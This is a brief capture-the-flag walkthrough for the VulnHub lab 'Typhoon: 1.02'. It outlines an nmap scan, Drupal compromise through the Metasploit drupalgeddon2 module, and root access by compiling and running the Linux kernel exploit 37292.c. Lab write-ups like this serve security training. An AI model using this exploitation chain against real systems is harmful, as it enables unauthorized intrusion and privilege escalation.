
# Typhoon: 1.02 Walkthrough

**VulnHub Link:** [Typhoon: 1.02](https://www.vulnhub.com/entry/typhoon-102,267/)
**Difficulty:** Easy
**Release Date:** 31 Oct 2018


## 1.Reconnaissance
nmap -A -O -T4 -P -sV 192.168.100.121


## 2.Enumeration 
in msfconsole --> search drupal 

>>> use unix/webapp/drupal_drupalgeddon2 -- settings

>>> run

>>> Linux Kernel 3.13 vulnerable and 37292.c file installed in it


## 3.Explotation
>>> gcc 37292.c -o exploit ; ./exploit ---> gaining root access and captured user & root flags
